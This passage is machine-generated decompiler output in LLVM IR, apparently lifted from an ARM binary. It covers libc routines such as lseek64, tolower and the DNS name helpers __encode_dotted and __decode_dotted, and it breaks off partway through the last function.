  uselistorder i32 7, { 2, 21, 22, 11, 12, 13, 0, 17, 24, 20, 1, 3, 4, 5, 18, 19, 8, 14, 15, 6, 7, 16, 10, 9, 23 }
  uselistorder i32* @global_var_224e8, { 0, 6, 2, 7, 1, 3, 4, 8, 5, 9 }
  uselistorder i32 35, { 0, 2, 3, 1 }
  uselistorder i32 10, { 3, 4, 38, 5, 6, 39, 40, 41, 42, 43, 30, 14, 29, 7, 44, 1, 45, 46, 47, 48, 12, 15, 35, 16, 36, 17, 18, 19, 0, 31, 32, 20, 27, 28, 37, 9, 21, 13, 33, 34, 11, 10, 2, 49, 22, 8, 24, 25, 23, 26, 50 }
  uselistorder i32 12, { 47, 48, 49, 0, 50, 7, 51, 19, 12, 13, 3, 54, 14, 10, 70, 71, 72, 73, 74, 75, 11, 76, 77, 78, 79, 80, 81, 15, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 5, 4, 41, 42, 43, 16, 20, 46, 63, 21, 22, 64, 65, 66, 1, 23, 67, 8, 68, 9, 24, 2, 69, 17, 55, 56, 57, 58, 82, 6, 44, 52, 53, 25, 26, 27, 28, 29, 30, 45, 59, 60, 61, 18, 62 }
  uselistorder i32* @sb, { 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 2, 3, 25, 26, 27, 28, 29, 30, 31, 32, 33, 4, 5, 34, 35, 36, 37, 38, 39, 6, 7, 8, 9, 10, 11, 0, 12, 1 }
  uselistorder i32 80, { 0, 2, 3, 4, 1, 5 }
  uselistorder i32 48, { 15, 5, 18, 2, 10, 11, 12, 3, 6, 13, 7, 19, 17, 14, 1, 0, 16, 8, 9, 4 }
  uselistorder i32 36, { 11, 12, 13, 15, 16, 17, 18, 4, 1, 14, 0, 8, 9, 10, 2, 3, 5, 6, 7 }
  uselistorder i32 56, { 4, 3, 6, 2, 7, 1, 0, 8, 5 }
  uselistorder i32 44, { 9, 10, 11, 7, 8, 15, 1, 6, 14, 13, 0, 12, 2, 3, 4, 5 }
  uselistorder i32 -48, { 2, 3, 0, 4, 5, 6, 7, 1 }
  uselistorder i32 -32, { 1, 5, 2, 6, 7, 3, 0, 4 }
  uselistorder i32 32, { 62, 63, 64, 0, 65, 66, 42, 74, 35, 75, 30, 31, 27, 51, 36, 52, 53, 45, 46, 4, 3, 6, 5, 8, 7, 1, 28, 69, 67, 68, 54, 19, 55, 2, 37, 56, 57, 58, 59, 60, 20, 61, 43, 44, 70, 71, 72, 73, 76, 38, 47, 39, 29, 48, 49, 50, 10, 9, 21, 32, 40, 22, 12, 11, 14, 13, 23, 16, 15, 24, 25, 18, 17, 26, 33, 34, 41 }
  uselistorder i32* @fp, { 37, 40, 38, 1, 39, 41, 42, 43, 44, 0, 46, 45, 47, 48, 49, 18, 2, 50, 51, 52, 53, 54, 55, 56, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 31, 32, 33, 34, 35, 36, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 107, 108, 106, 101, 102, 103, 104, 105 }
  uselistorder i32* @sl, { 23, 24, 25, 26, 29, 27, 28, 30, 31, 32, 33, 34, 35, 36, 37, 38, 3, 4, 39, 40, 0, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 5, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 6, 7, 8, 9, 10, 11, 12, 1, 13, 14, 15, 16, 17, 2, 18, 19, 20, 21, 22 }
  uselistorder i32* @r8, { 31, 32, 33, 34, 35, 36, 37, 5, 6, 7, 38, 43, 44, 0, 45, 80, 81, 82, 83, 1, 84, 85, 86, 87, 19, 20, 95, 96, 8, 9, 10, 11, 12, 13, 14, 94, 88, 89, 90, 91, 92, 93, 21, 22, 23, 24, 25, 26, 3, 4, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 2, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 27, 28, 29, 30, 39, 40, 41, 42, 15, 16, 17, 18 }
  uselistorder i32* @r7, { 66, 68, 69, 67, 70, 71, 72, 73, 74, 75, 9, 10, 11, 12, 13, 14, 15, 1, 76, 84, 83, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 43, 44, 45, 46, 117, 16, 17, 2, 18, 6, 19, 20, 21, 22, 23, 24, 25, 26, 27, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 47, 48, 49, 50, 28, 29, 30, 31, 85, 3, 86, 87, 4, 5, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 0, 7, 8, 115, 116, 62, 63, 64, 65, 77, 78, 79, 80, 81, 82, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42 }
  uselistorder label %dec_label_pc_17080, { 4, 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_1707c, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder label %dec_label_pc_1704c, { 3, 0, 1, 2, 4 }
  uselistorder label %dec_label_pc_17048, { 2, 1, 0 }
  uselistorder label %dec_label_pc_16fec, { 1, 0 }
  uselistorder label %dec_label_pc_16f98, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_16f38.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_16f78, { 1, 0 }
  uselistorder label %dec_label_pc_16ef4, { 1, 0 }
  uselistorder label %bb74, { 1, 0 }
  uselistorder label %dec_label_pc_16da8, { 1, 0 }
}

define i32 @__libc_lseek64(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %tmp9 = call i32 @__decompiler_undefined_function_0()
  store i32 %arg1, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_170d4, label %dec_label_pc_170c0

dec_label_pc_170c0:                               ; preds = %entry
  %v0_170c0 = call i32 @__errno_location()
  %v0_170c4 = load i32, i32* %r4.global-to-local, align 4
  %v1_170c4 = sub i32 0, %v0_170c4
  store i32 -1, i32* %r4.global-to-local, align 4
  %v2_170cc = inttoptr i32 %v0_170c0 to i32*
  store i32 %v1_170c4, i32* %v2_170cc, align 4
  %v0_170dc.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_170dc

dec_label_pc_170d4:                               ; preds = %entry
  %v2_170d4 = icmp eq i32 %arg1, 0
  br i1 %v2_170d4, label %dec_label_pc_170e8, label %dec_label_pc_170dc

dec_label_pc_170dc:                               ; preds = %dec_label_pc_170d4, %dec_label_pc_170c0
  %v0_170dc = phi i32 [ %arg1, %dec_label_pc_170d4 ], [ %v0_170dc.pre, %dec_label_pc_170c0 ]
  br label %dec_label_pc_170ec

dec_label_pc_170e8:                               ; preds = %dec_label_pc_170d4
  br label %dec_label_pc_170ec

dec_label_pc_170ec:                               ; preds = %dec_label_pc_170dc, %dec_label_pc_170e8
  %v14_170f0 = phi i32 [ %v0_170dc, %dec_label_pc_170dc ], [ %tmp9, %dec_label_pc_170e8 ]
  ret i32 %v14_170f0

; uselistorder directives
  uselistorder i32 ()* @__errno_location, { 53, 44, 71, 70, 69, 43, 42, 52, 51, 41, 17, 37, 50, 49, 26, 55, 12, 11, 10, 9, 23, 8, 22, 73, 65, 64, 57, 56, 68, 67, 66, 0, 63, 25, 36, 35, 54, 16, 29, 32, 40, 31, 34, 48, 47, 46, 1, 39, 38, 15, 45, 7, 6, 62, 28, 27, 61, 21, 5, 14, 2, 20, 13, 60, 59, 33, 19, 18, 58, 4, 3, 72, 30, 24 }
  uselistorder i32 %arg1, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_170ec, { 1, 0 }
}

define i32 @__GI_tolower(i32 %arg1) local_unnamed_addr {
entry:
  %v1_170fc = icmp slt i32 %arg1, 0
  br i1 %v1_170fc, label %bb, label %bb1

bb:                                               ; preds = %entry
  ret i32 %arg1

bb1:                                              ; preds = %entry
  %v2_170fc = mul i32 %arg1, 2
  %v2_17108 = load i32, i32* bitcast (i32** @global_var_22824.418 to i32*), align 4
  %v2_1710c = add i32 %v2_17108, %v2_170fc
  %v3_17110 = inttoptr i32 %v2_1710c to i8*
  %v4_17110 = load i8, i8* %v3_17110, align 1
  %v6_17110 = zext i8 %v4_17110 to i32
  %v1_17114 = add i32 %v2_1710c, 1
  %v2_17114 = inttoptr i32 %v1_17114 to i8*
  %v3_17114 = load i8, i8* %v2_17114, align 1
  %v4_17114 = zext i8 %v3_17114 to i32
  %v3_17118 = mul nuw i32 %v4_17114, 16777216
  %v4_1711c = sdiv i32 %v3_17118, 65536
  %v5_1711c = or i32 %v4_1711c, %v6_17110
  ret i32 %v5_1711c

; uselistorder directives
  uselistorder i32 %v2_1710c, { 1, 0 }
}

define i32 @__encode_dotted(i8* %arg1) local_unnamed_addr {
entry:
  %cpsr_n.global-to-local = alloca i1, align 1
  %cpsr_v.global-to-local = alloca i1, align 1
  %cpsr_z.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_17128 = load i32, i32* @r4, align 4
  store i32 %v3_17128, i32* %stack_var_-24, align 4
  %v6_17128 = load i32, i32* @r5, align 4
  %v9_17128 = load i32, i32* @r6, align 4
  store i32 %tmp, i32* @r4, align 4
  %v0_17130 = load i32, i32* @r1, align 4
  store i32 %v0_17130, i32* @r6, align 4
  %v0_17134 = load i32, i32* @r2, align 4
  store i32 %v0_17134, i32* %r8.global-to-local, align 4
  store i32 0, i32* %r7.global-to-local, align 4
  store i32 %tmp, i32* %r0.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_1719c19 = icmp slt i8* %arg1, null
  store i1 %v1_1719c19, i1* %cpsr_n.global-to-local, align 1
  %v2_1719c20 = icmp eq i8* %arg1, null
  store i1 %v2_1719c20, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1719c20, label %dec_label_pc_171b4, label %dec_label_pc_171a8

dec_label_pc_17140:                               ; preds = %dec_label_pc_171a8
  %v2_17140 = call i32 @__GI_strchr(i32 %v0_1714021, i32 46)
  store i32 %v2_17140, i32* @r5, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_17144 = icmp slt i32 %v2_17140, 0
  store i1 %v1_17144, i1* %cpsr_n.global-to-local, align 1
  %v2_17144 = icmp eq i32 %v2_17140, 0
  store i1 %v2_17144, i1* %cpsr_z.global-to-local, align 1
  %v0_17148 = load i32, i32* @r4, align 4
  %v2_17148 = sub i32 %v2_17140, %v0_17148
  store i32 %v2_17148, i32* @ip, align 4
  store i32 %v0_17148, i32* %r0.global-to-local, align 4
  br i1 %v2_17144, label %dec_label_pc_17154, label %dec_label_pc_1715c

dec_label_pc_17154:                               ; preds = %dec_label_pc_17140
  %v1_1714c = inttoptr i32 %v0_17148 to i8*
  %v3_17154 = call i32 @strlen(i8* %v1_1714c)
  store i32 %v3_17154, i32* %r0.global-to-local, align 4
  %sext = mul i32 %v3_17154, 16777216
  %v1_17158 = sdiv i32 %sext, 16777216
  store i32 %v1_17158, i32* @ip, align 4
  %v0_17168.pre = load i32, i32* @r4, align 4
  %v0_17178.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_1715c

dec_label_pc_1715c:                               ; preds = %dec_label_pc_17140, %dec_label_pc_17154
  %v0_17178 = phi i32 [ %v2_17140, %dec_label_pc_17140 ], [ %v0_17178.pre, %dec_label_pc_17154 ]
  %v0_17168 = phi i32 [ %v0_17148, %dec_label_pc_17140 ], [ %v0_17168.pre, %dec_label_pc_17154 ]
  %v0_17188 = phi i32 [ %v2_17148, %dec_label_pc_17140 ], [ %v1_17158, %dec_label_pc_17154 ]
  %v0_1715c = load i32, i32* %r7.global-to-local, align 4
  %v1_1715c = add i32 %v0_1715c, 1
  store i32 %v1_1715c, i32* @lr, align 4
  %v1_17160 = load i32, i32* %r8.global-to-local, align 4
  %v2_17160 = sub i32 %v1_17160, %v0_1715c
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_17164 = icmp slt i32 %v0_17188, 0
  store i1 %v1_17164, i1* %cpsr_n.global-to-local, align 1
  %v2_17164 = icmp eq i32 %v0_17188, 0
  store i1 %v2_17164, i1* %cpsr_z.global-to-local, align 1
  store i32 %v0_17168, i32* @r1, align 4
  %v0_1716c = load i32, i32* @r6, align 4
  %v2_1716c = add i32 %v0_1716c, %v1_1715c
  store i32 %v2_1716c, i32* @r0, align 4
  store i32 %v0_17188, i32* @r2, align 4
  %v1_17174 = add i32 %v2_17160, -1
  %v1_17178 = add i32 %v0_17178, 1
  store i32 %v1_17178, i32* @r4, align 4
  br i1 %v2_17164, label %.loopexit, label %dec_label_pc_17180

dec_label_pc_17180:                               ; preds = %dec_label_pc_1715c
  %v2_17180 = sub i32 %v0_17188, %v1_17174
  %v3_17180 = icmp ult i32 %v0_17188, %v1_17174
  %v4_17180 = xor i32 %v1_17174, %v0_17188
  %v5_17180 = xor i32 %v2_17180, %v0_17188
  %v6_17180 = and i32 %v5_17180, %v4_17180
  %v7_17180 = icmp slt i32 %v6_17180, 0
  store i1 %v7_17180, i1* %cpsr_v.global-to-local, align 1
  %v8_17180 = icmp slt i32 %v2_17180, 0
  store i1 %v8_17180, i1* %cpsr_n.global-to-local, align 1
  %v9_17180 = icmp eq i32 %v0_17188, %v1_17174
  store i1 %v9_17180, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_17180, label %dec_label_pc_17188, label %.loopexit

dec_label_pc_17188:                               ; preds = %dec_label_pc_17180
  %v1_17188 = trunc i32 %v0_17188 to i8
  %v4_17188 = add i32 %v0_1716c, %v0_1715c
  %v5_17188 = inttoptr i32 %v4_17188 to i8*
  store i8 %v1_17188, i8* %v5_17188, align 1
  %v0_1718c = load i32, i32* @lr, align 4
  %v1_1718c = load i32, i32* @ip, align 4
  %v2_1718c = add i32 %v1_1718c, %v0_1718c
  store i32 %v2_1718c, i32* %r7.global-to-local, align 4
  %v0_17190 = call i32 @memcpy()
  store i32 %v0_17190, i32* %r0.global-to-local, align 4
  %v0_17194 = load i32, i32* @r5, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_17194 = icmp slt i32 %v0_17194, 0
  store i1 %v1_17194, i1* %cpsr_n.global-to-local, align 1
  %v2_17194 = icmp eq i32 %v0_17194, 0
  store i1 %v2_17194, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_17194, label %dec_label_pc_171b4, label %dec_label_pc_17188.dec_label_pc_1719c_crit_edge

dec_label_pc_17188.dec_label_pc_1719c_crit_edge:  ; preds = %dec_label_pc_17188
  %v0_1719c.pre = load i32, i32* @r4, align 4
  store i32 %v0_1719c.pre, i32* %r0.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_1719c = icmp slt i32 %v0_1719c.pre, 0
  store i1 %v1_1719c, i1* %cpsr_n.global-to-local, align 1
  %v2_1719c = icmp eq i32 %v0_1719c.pre, 0
  store i1 %v2_1719c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1719c, label %dec_label_pc_171b4, label %dec_label_pc_171a8

dec_label_pc_171a8:                               ; preds = %entry, %dec_label_pc_17188.dec_label_pc_1719c_crit_edge
  %v0_1714021 = phi i32 [ %v0_1719c.pre, %dec_label_pc_17188.dec_label_pc_1719c_crit_edge ], [ %tmp, %entry ]
  %v1_171a8 = inttoptr i32 %v0_1714021 to i8*
  %v2_171a8 = load i8, i8* %v1_171a8, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_171ac = icmp eq i8 %v2_171a8, 0
  store i1 %v2_171ac, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_171ac, label %dec_label_pc_171b4, label %dec_label_pc_17140

dec_label_pc_171b4:                               ; preds = %dec_label_pc_17188.dec_label_pc_1719c_crit_edge, %dec_label_pc_17188, %dec_label_pc_171a8, %entry
  %v0_171b4 = load i32, i32* %r8.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_171b4 = icmp slt i32 %v0_171b4, 0
  store i1 %v1_171b4, i1* %cpsr_n.global-to-local, align 1
  %v2_171b4 = icmp eq i32 %v0_171b4, 0
  store i1 %v2_171b4, i1* %cpsr_z.global-to-local, align 1
  %tmp16 = icmp slt i32 %v0_171b4, 1
  br i1 %tmp16, label %bb17, label %bb

bb:                                               ; preds = %dec_label_pc_171b4
  %v5_171bc = load i32, i32* %r7.global-to-local, align 4
  %v6_171bc = add i32 %v5_171bc, 1
  store i32 %v6_171bc, i32* %r0.global-to-local, align 4
  %v7_171c0 = load i32, i32* @r6, align 4
  %v9_171c0 = add i32 %v7_171c0, %v5_171bc
  %v10_171c0 = inttoptr i32 %v9_171c0 to i8*
  store i8 0, i8* %v10_171c0, align 1
  %v0_171c4.pre = load i1, i1* %cpsr_z.global-to-local, align 1
  %v1_171c4.pre = load i1, i1* %cpsr_n.global-to-local, align 1
  %v2_171c4.pre = load i1, i1* %cpsr_v.global-to-local, align 1
  br label %bb17

bb17:                                             ; preds = %dec_label_pc_171b4, %bb
  %v2_171c4 = phi i1 [ %v2_171c4.pre, %bb ], [ false, %dec_label_pc_171b4 ]
  %v1_171c4 = phi i1 [ %v1_171c4.pre, %bb ], [ %v1_171b4, %dec_label_pc_171b4 ]
  %v0_171c4 = phi i1 [ %v0_171c4.pre, %bb ], [ %v2_171b4, %dec_label_pc_171b4 ]
  %v3_171c4 = xor i1 %v2_171c4, %v1_171c4
  %v4_171c4 = or i1 %v0_171c4, %v3_171c4
  br i1 %v4_171c4, label %.loopexit, label %bb18

bb18:                                             ; preds = %bb17
  %v7_171c4 = load i32, i32* %stack_var_-24, align 4
  store i32 %v7_171c4, i32* @r4, align 4
  store i32 %v6_17128, i32* @r5, align 4
  store i32 %v9_17128, i32* @r6, align 4
  %v25_171c4 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v25_171c4

.loopexit:                                        ; preds = %dec_label_pc_17180, %dec_label_pc_1715c, %bb17
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_171cc = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_171cc, i32* @r4, align 4
  store i32 %v6_17128, i32* @r5, align 4
  store i32 %v9_17128, i32* @r6, align 4
  ret i32 -1

; uselistorder directives
  uselistorder i32 %v0_171b4, { 0, 2, 1 }
  uselistorder i32 %v0_1719c.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_17194, { 1, 0 }
  uselistorder i32 %v2_17180, { 1, 0 }
  uselistorder i32 %v1_17174, { 2, 0, 3, 1 }
  uselistorder i32 %v0_17188, { 2, 4, 0, 1, 5, 3, 6, 7, 8 }
  uselistorder i32 %v1_17158, { 1, 0 }
  uselistorder i32 %v0_17148, { 0, 2, 1, 3 }
  uselistorder i1 %v2_1719c20, { 1, 0 }
  uselistorder i32 %v9_17128, { 1, 0 }
  uselistorder i32 %v6_17128, { 1, 0 }
  uselistorder i32* %r8.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r7.global-to-local, { 1, 0, 2, 3 }
  uselistorder i32* %r0.global-to-local, { 2, 7, 3, 8, 4, 6, 5, 1, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 1, 2, 7, 8, 3, 4, 5, 6, 0 }
  uselistorder i1* %cpsr_v.global-to-local, { 1, 2, 7, 8, 3, 4, 5, 6, 0 }
  uselistorder i1* %cpsr_n.global-to-local, { 1, 2, 7, 8, 3, 4, 5, 6, 0 }
  uselistorder i32 16777216, { 1, 0, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 25, 24, 26, 27, 28, 29, 30, 31, 32, 33, 36, 34, 37, 35, 40, 38, 41, 39, 43, 42, 45, 44, 47, 46, 49, 48 }
  uselistorder i32 (i8*)* @strlen, { 3, 21, 20, 9, 6, 13, 12, 11, 22, 19, 18, 17, 15, 16, 14, 8, 7, 10, 25, 24, 23, 5, 4, 2, 1, 0 }
  uselistorder i32 (i32, i32)* @__GI_strchr, { 0, 2, 1, 8, 7, 6, 5, 4, 3 }
  uselistorder i32 46, { 0, 3, 4, 1, 2 }
  uselistorder i32* @r6, { 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 11, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 1, 0, 18, 19, 20, 21, 22, 137, 2, 138, 139, 140, 147, 148, 149, 150, 54, 3, 55, 56, 57, 151, 155, 154, 156, 157, 158, 176, 177, 178, 179, 180, 181, 182, 183, 184, 185, 186, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 4, 71, 72, 73, 74, 75, 76, 77, 210, 215, 28, 29, 23, 24, 25, 103, 104, 105, 106, 26, 27, 30, 31, 32, 33, 34, 35, 36, 37, 207, 208, 209, 187, 188, 5, 189, 190, 191, 192, 193, 194, 204, 13, 205, 206, 6, 78, 195, 196, 197, 198, 199, 200, 141, 142, 143, 144, 145, 146, 79, 80, 81, 82, 83, 84, 85, 86, 159, 160, 161, 162, 163, 7, 12, 164, 38, 8, 39, 40, 165, 9, 166, 167, 87, 88, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 15, 16, 17, 89, 90, 91, 92, 211, 212, 213, 214, 14, 168, 169, 170, 171, 10, 172, 173, 174, 175, 152, 153, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 201, 202, 203 }
  uselistorder label %.loopexit, { 2, 0, 1 }
  uselistorder label %bb17, { 1, 0 }
  uselistorder label %dec_label_pc_171b4, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_171a8, { 1, 0 }
  uselistorder label %dec_label_pc_1715c, { 1, 0 }
}

define i32 @__decode_dotted() local_unnamed_addr {
entry:
  %fp.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %v3_171d0 = load i32, i32* @r4, align 4
  %v6_171d0 = load i32, i32* @r5, align 4
  %v0_171d4 = load i32, i32* @r0, align 4
  store i32 %v0_171d4, i32* %sl.global-to-local, align 4
  %v2_171d4 = icmp eq i32 %v0_171d4, 0
  br i1 %v2_171d4, label %.thread16, label %dec_label_pc_17274.preheader

.thread16:                                        ; preds = %entry
  %v0_171e01 = load i32, i32* @r2, align 4
  store i32 %v0_171e01, i32* %sb.global-to-local, align 4
  %v0_171e42 = load i32, i32* @r3, align 4
  store i32 %v0_171e42, i32* %stack_var_-40, align 4
  br label %dec_label_pc_17294

dec_label_pc_17274.preheader:                     ; preds = %entry
  store i32 0, i32* %r8.global-to-local, align 4
  %v0_171e0 = load i32, i32* @r2, align 4
  store i32 %v0_171e0, i32* %sb.global-to-local, align 4
  %v0_171e4 = load i32, i32* @r3, align 4
  store i32 %v0_171e4, i32* %stack_var_-40, align 4
  store i32 1, i32* %fp.global-to-local, align 4
  %v1_172743952 = load i32, i32* @r1, align 4
  %v2_172744053 = add i32 %v1_172743952, %v0_171d4
  %v3_172744154 = inttoptr i32 %v2_172744053 to i8*
  %v4_172744255 = load i8, i8* %v3_172744154, align 1
  %v6_172744356 = zext i8 %v4_172744255 to i32
  store i32 %v6_172744356, i32* @r4, align 4
  %v2_172784457 = icmp eq i8 %v4_172744255, 0
  br i1 %v2_172784457, label %bb35, label %dec_label_pc_171f8.lr.ph

dec_label_pc_171f8:                               ; preds = %dec_label_pc_171f8.lr.ph, %bb30
  %v2_1728050 = phi i1 [ %v2_172804663, %dec_label_pc_171f8.lr.ph ], [ true, %bb30 ]
  %v6_1727448 = phi i32 [ %v6_172744361, %dec_label_pc_171f8.lr.ph ], [ %v6_17274, %bb30 ]
  %v1_1727447 = phi i32 [ %v1_172743960, %dec_label_pc_171f8.lr.ph ], [ %v5_17220, %bb30 ]
  %v1_171fc = and i32 %v6_1727448, 192
  br i1 %v2_1728050, label %bb28, label %bb

bb:                                               ; preds = %dec_label_pc_171f8
  %v1_17200 = load i32, i32* %r8.global-to-local, align 4
  %v2_17200 = add i32 %v1_17200, 1
  store i32 %v2_17200, i32* %r8.global-to-local, align 4
  br label %bb28

bb28:                                             ; preds = %dec_label_pc_171f8, %bb
  %v2_17204 = icmp eq i32 %v1_171fc, 192
  %v1_17208 = add i32 %v1_1727447, 1
  store i32 %v1_17208, i32* @r5, align 4
  br i1 %v2_17204, label %dec_label_pc_17210, label %dec_label_pc_17230

dec_label_pc_17210:                               ; preds = %bb28
  %v2_17210 = add i32 %v1_17208, %v0_17210.ph59
  %v3_17210 = inttoptr i32 %v2_17210 to i8*
  %v4_17210 = load i8, i8* %v3_17210, align 1
  %v6_17210 = zext i8 %v4_17210 to i32
  %v1_17218 = urem i32 %v6_1727448, 64
  br i1 %v2_1728050, label %bb30, label %bb29

bb29:                                             ; preds = %dec_label_pc_17210
  %v1_1721c = load i32, i32* %r8.global-to-local, align 4
  %v2_1721c = add i32 %v1_1721c, 1
  store i32 %v2_1721c, i32* %r8.global-to-local, align 4
  br label %bb30

bb30:                                             ; preds = %dec_label_pc_17210, %bb29
  %v4_17220 = mul nuw nsw i32 %v1_17218, 256
  %v5_17220 = or i32 %v6_17210, %v4_17220
  store i32 %v5_17220, i32* %r1.global-to-local, align 4
  store i32 %storemerge17.ph58, i32* %r7.global-to-local, align 4
  store i32 0, i32* %fp.global-to-local, align 4
  %v2_17274 = add i32 %v5_17220, %v0_17210.ph59
  %v3_17274 = inttoptr i32 %v2_17274 to i8*
  %v4_17274 = load i8, i8* %v3_17274, align 1
  %v6_17274 = zext i8 %v4_17274 to i32
  store i32 %v6_17274, i32* @r4, align 4
  %v2_17278 = icmp eq i8 %v4_17274, 0
  br i1 %v2_17278, label %dec_label_pc_17280.bb36_crit_edge, label %dec_label_pc_171f8

dec_label_pc_17230:                               ; preds = %bb28
  %v2_17230 = add i32 %v6_1727448, %storemerge17.ph58
  store i32 %v2_17230, i32* %r6.global-to-local, align 4
  %v2_17234 = load i32, i32* %stack_var_-40, align 4
  %v1_17238 = add i32 %v2_17230, 1
  store i32 %v1_17238, i32* %r7.global-to-local, align 4
  %v3_1723c = icmp ult i32 %v1_17238, %v2_17234
  br i1 %v3_1723c, label %dec_label_pc_17244, label %dec_label_pc_17294

dec_label_pc_17244:                               ; preds = %dec_label_pc_17230
  %v2_17244 = add i32 %v1_17208, %v0_17210.ph59
  store i32 %v2_17244, i32* @r1, align 4
  %v0_17248 = load i32, i32* %sb.global-to-local, align 4
  %v2_17248 = add i32 %v0_17248, %storemerge17.ph58
  store i32 %v2_17248, i32* @r0, align 4
  store i32 %v6_1727448, i32* @r2, align 4
  %v0_17250 = call i32 @memcpy()
  %v0_17254 = load i32, i32* @r5, align 4
  %v1_17254 = load i32, i32* @r4, align 4
  %v2_17254 = add i32 %v1_17254, %v0_17254
  store i32 %v2_17254, i32* %r1.global-to-local, align 4
  %v0_17258 = load i32, i32* %sl.global-to-local, align 4
  %v2_17258 = add i32 %v0_17258, %v2_17254
  %v3_17258 = inttoptr i32 %v2_17258 to i8*
  %v4_17258 = load i8, i8* %v3_17258, align 1
  %v0_1725c = load i32, i32* %fp.global-to-local, align 4
  %v2_1725c = icmp eq i32 %v0_1725c, 0
  br i1 %v2_1725c, label %bb32, label %bb31

bb31:                                             ; preds = %dec_label_pc_17244
  %v1_17260 = load i32, i32* %r8.global-to-local, align 4
  %v3_17260 = add i32 %v1_17260, %v1_17254
  store i32 %v3_17260, i32* %r8.global-to-local, align 4
  br label %bb32

bb32:                                             ; preds = %dec_label_pc_17244, %bb31
  %v2_17264 = icmp eq i8 %v4_17258, 0
  br i1 %v2_17264, label %bb34, label %bb33

bb33:                                             ; preds = %bb32
  br label %bb34

bb34:                                             ; preds = %bb32, %bb33
  %v0_1726c.off0 = phi i8 [ 0, %bb32 ], [ 46, %bb33 ]
  %v2_1726c = load i32, i32* %sb.global-to-local, align 4
  %v3_1726c = load i32, i32* %r6.global-to-local, align 4
  %v4_1726c = add i32 %v3_1726c, %v2_1726c
  %v5_1726c = inttoptr i32 %v4_1726c to i8*
  store i8 %v0_1726c.off0, i8* %v5_1726c, align 1
  %v0_17270.pre = load i32, i32* %r7.global-to-local, align 4
  %v0_17274.pre.pre = load i32, i32* %sl.global-to-local, align 4
  %v0_17280.pre.pre = load i32, i32* %fp.global-to-local, align 4
  %v1_1727439 = load i32, i32* %r1.global-to-local, align 4
  %v2_1727440 = add i32 %v1_1727439, %v0_17274.pre.pre
  %v3_1727441 = inttoptr i32 %v2_1727440 to i8*
  %v4_1727442 = load i8, i8* %v3_1727441, align 1
  %v6_1727443 = zext i8 %v4_1727442 to i32
  store i32 %v6_1727443, i32* @r4, align 4
  %v2_1727844 = icmp eq i8 %v4_1727442, 0
  %v2_1728046 = icmp eq i32 %v0_17280.pre.pre, 0
